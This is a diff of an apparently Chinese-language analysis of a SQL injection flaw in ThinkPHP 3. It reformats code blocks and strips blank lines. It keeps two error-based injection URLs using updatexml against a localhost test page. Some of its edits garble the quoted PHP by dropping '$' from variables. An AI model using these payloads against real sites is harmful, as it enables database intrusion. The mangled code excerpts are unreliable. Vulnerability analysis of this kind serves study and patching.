@@ -26,7 +26,6 @@ thinkphp3的github地址为：[https://github.com/top-think/thinkphp](https://gi
 
 ```bash
 git checkout 109bf30
-
 ```
 
 
@@ -71,7 +70,6 @@ git checkout 109bf30
 
 ```html
 http://127.0.0.1:8888/index.php?m=Home&c=Index&a=test&id[where]=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
-
 ```
 
 
@@ -112,12 +110,11 @@ http://127.0.0.1:8888/index.php?m=Home&c=Index&a=test&id[where]=1 and updatexml(
 
 
 ```php
-        _if (isnumeric(_$options) || is_string($options)) {
+        if (isnumeric($options) || is_string($options)) {
             $where[$this->getPk()] = $options;
             $options               = array();
             $options['where']      = $where;
         }
-
 ```
 
 
@@ -131,26 +128,25 @@ http://127.0.0.1:8888/index.php?m=Home&c=Index&a=test&id[where]=1 and updatexml(
 
 
 ```php
-_if (isarray(_$options) && (count($_options) > 0) && isarray($pk)) {
+_if (isarray(_options) && (count(_options) > 0) && isarray($pk)) {
             // 根据复合主键查询
             $count = 0;
-            foreach (arraykeys(_$options) as $_key) {
+            foreach (arraykeys(_options) as _key) {
                 if (isint($key)) {
                     $count++;
                 }
 
             }
-            if (count(_$pk) == $count) {
+            if (count(_pk) == count) {
                 $i = 0;
-                foreach ($pk as $field) {
-                    $where[$field] = $options[$i];
-                    unset($options[$i++]);
+                foreach (pk as field) {
+                    where[field] = options[i];
+                    unset(options[i++]);
                 }
-                $options['where'] = $where;
+                options['where'] = where;
             } else {
                 return false;
             }
-
 ```
 
 
@@ -176,15 +172,14 @@ _if (isarray(_$options) && (count($_options) > 0) && isarray($pk)) {
 if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) {
             // 对数组查询条件进行字段类型检查
             foreach ($options['where'] as $key => $val) {
-                $key = trim($_key);
-                if (inarray(_$key, $_fields, true)) {
-                    if (isscalar($val)) {_
+                $key = trim($key);
+                if (inarray($key, $fields, true)) {
+                    if (isscalar($val)) {
                         $this->_parseType($options['where'], $key);
                     }
                 }
             }
         }
-
 ```
 
 
@@ -220,7 +215,6 @@ if (isset($options['where']) && is_array($options['where']) && !empty($fields) &
 
 ```html
 http://127.0.0.1:8888/index.php?m=Home&c=Index&a=test&id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
-
 ```
 
 
@@ -260,8 +254,7 @@ http://127.0.0.1:8888/index.php?m=Home&c=Index&a=test&id=1 and updatexml(1,conca
 
 
 ```sql
-_select  from users limit 1_
-
+select  from users limit 1
 ```
 
 
